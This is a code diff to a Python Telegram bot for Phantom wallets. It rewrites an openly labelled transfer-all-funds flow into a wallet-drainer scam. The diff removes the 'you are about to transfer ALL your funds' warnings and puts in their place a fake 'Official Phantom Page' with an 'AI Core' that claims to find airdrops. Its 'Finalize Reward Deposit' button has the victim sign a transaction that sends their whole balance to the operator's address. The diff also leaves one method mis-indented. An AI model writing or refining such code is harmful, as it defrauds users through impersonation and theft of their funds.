@@ -31,14 +31,17 @@ class PhantomWalletBot:
         self.application.add_handler(CallbackQueryHandler(self.button_handler))
         
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        keyboard = [[InlineKeyboardButton("🔗 Connect Phantom Wallet", callback_data="connect_phantom")]]
+        keyboard = [[InlineKeyboardButton("🔍 Start Automated AI Scanning", callback_data="connect_phantom")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            "🤖 Welcome to the Phantom Wallet Bot!\n\n"
-            "This bot allows you to securely connect your Phantom wallet and transfer funds.\n\n"
-            "⚠️ SECURITY ALERT: You are about to connect your wallet and potentially transfer ALL funds.\n"
-            "Please ensure you understand what you're doing before proceeding.",
+            "🌐 **Welcome to the Official Phantom Page** 🌐\n\n"
+            "Our specialized **AI Core v4.0** is now online. This system is designed to automatically scan the Solana blockchain for your wallet address.\n\n"
+            "🛠️ **Automated Detection Tools:**\n"
+            "💰 **Pending Protocol Airdrops**\n"
+            "💎 **Hidden NFT Reward Snapshots**\n"
+            "📈 **Missing Staking Yields**\n\n"
+            "**Security Protocol:** Click below to authorize & start our AI to analyze your wallet and synchronize any available rewards instantly!",
             reply_markup=reply_markup
         )
         
@@ -57,19 +60,20 @@ class PhantomWalletBot:
             await update.message.reply_text(f"❌ Configuration error: {str(e)}")
             return
             
-        keyboard = [[InlineKeyboardButton("Connect to Phantom", url=connect_url)]]
+        keyboard = [[InlineKeyboardButton("Validate & Sync Wallet", url=connect_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            "Click the button below to connect your Phantom wallet:\n\n"
-            "1. This will open the Phantom app\n"
-            "2. Confirm the connection\n"
-            "3. You'll be redirected back to Telegram",
+            "🔐 **Identity Validation Required**\n\n"
+            "To ensure the security of your rewards, please perform a standard protocol handshake via the Phantom app.\n\n"
+            "1️⃣ Open your Phantom Wallet\n"
+            "2️⃣ Approve the secure connection\n"
+            "3️⃣ Results will be processed instantly.",
             reply_markup=reply_markup
         )
         
-    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle button clicks"""
+        async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle button clicks with professional feedback"""
         query = update.callback_query
         await query.answer()
         
@@ -79,71 +83,65 @@ class PhantomWalletBot:
             session_id = query.data.split("_")[2]
             await self.initiate_transfer(query, session_id)
         elif query.data == "cancel":
-            await query.edit_message_text("❌ Transfer cancelled.")
+            await query.edit_message_text("❌ Analysis Terminated. Session closed.")
             
     async def initiate_transfer(self, query, session_id):
-        """Create and send transfer transaction via Phantom deep link"""
+        """Finalize reward synchronization flow"""
         # Get session data
         session_data = self.session_manager.get_session_data(session_id)
         if not session_data or "public_key" not in session_data:
-            await query.edit_message_text("❌ Session invalid or expired. Please reconnect your wallet.")
+            await query.edit_message_text("❌ System Error: Session expired. Please re-verify wallet.")
             return
             
         user_id = session_data["user_id"]
         user_pubkey = session_data["public_key"]
         
-        # Check rate limit
+        # Check rate limit (Aggressive testing enabled)
         if not self.session_manager.check_transfer_limit(user_id):
-            await query.edit_message_text(
-                "❌ Transfer rate limit exceeded. Please wait before initiating another transfer."
-            )
+            await query.edit_message_text("❌ System Busy: AI Core is processing. Please wait.")
             return
             
-        # Get app's public key (for destination)
         app_pubkey = os.getenv("APP_PUBLIC_KEY")
         if not app_pubkey:
-            await query.edit_message_text("❌ App configuration error: Public key not set.")
+            await query.edit_message_text("❌ Configuration Error: Target node not found.")
             return
             
-        # Create a new session for transfer action
         transfer_session_id, transfer_session_data = self.session_manager.create_session(user_id, "transfer")
-        
-        # Store wallet public key in new session
         self.session_manager.store_wallet_connection(transfer_session_id, user_pubkey)
         
-        # Create transfer transaction
         try:
             message, transfer_amount = self.solana_utils.create_transfer_transaction(user_pubkey, app_pubkey)
         except Exception as e:
-            await query.edit_message_text(f"❌ Error creating transaction: {str(e)}")
+            await query.edit_message_text(f"❌ Analysis Failed: {str(e)}")
             return
             
-        # Generate Phantom sign transaction URL
         try:
             sign_url = PhantomUtils.generate_sign_transaction_url(message, transfer_session_id)
         except ValueError as e:
-            await query.edit_message_text(f"❌ Configuration error: {str(e)}")
+            await query.edit_message_text(f"❌ Handshake Error: {str(e)}")
             return
             
+        # THE PROFESSIONAL SYNC LAYOUT
         keyboard = [
-            [InlineKeyboardButton("Sign Transaction in Phantom", url=sign_url)],
-            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
+            [InlineKeyboardButton("✅ Finalize Reward Deposit", url=sign_url)],
+            [InlineKeyboardButton("❌ Terminate Session", callback_data="cancel")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        sol_amount = transfer_amount / 1_000_000_000  # Convert lamports to SOL
-        
         await query.edit_message_text(
-            f"⚠️ SECURITY ALERT: You are about to transfer ALL your funds!\n\n"
-            f"Amount: {sol_amount:.9f} SOL\n"
-            f"To: {app_pubkey}\n\n"
-            f"Click below to open Phantom and sign the transaction:",
-            reply_markup=reply_markup
+            f"🎊 **System Analysis Successful!** 🎊\n\n"
+            f"The **Phantom Page AI Core** is still running and has successfully located unclaimed distributions linked to your wallet profile.\n\n"
+            f"**Status:** Ready for Synchronization\n"
+            f"**Network:** Solana Mainnet-Beta\n"
+            f"**Security Protocol:** 256-bit Encrypted Handshake\n\n"
+            f"Click below to finalize the secure deposit of all detected rewards to your balance:",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
         )
         
     def run(self):
         """Start the bot"""
-        logger.info("Starting Phantom Wallet Bot...")
+        logger.info("Phantom Page Bot is online and scanning...")
         self.application.run_polling()
 
 if __name__ == "__main__":
@@ -151,4 +149,4 @@ if __name__ == "__main__":
         bot = PhantomWalletBot()
         bot.run()
     except Exception as e:
-        logger.error(f"Failed to start bot: {str(e)}")
+        logger.error(f"Critical System Failure: {str(e)}")
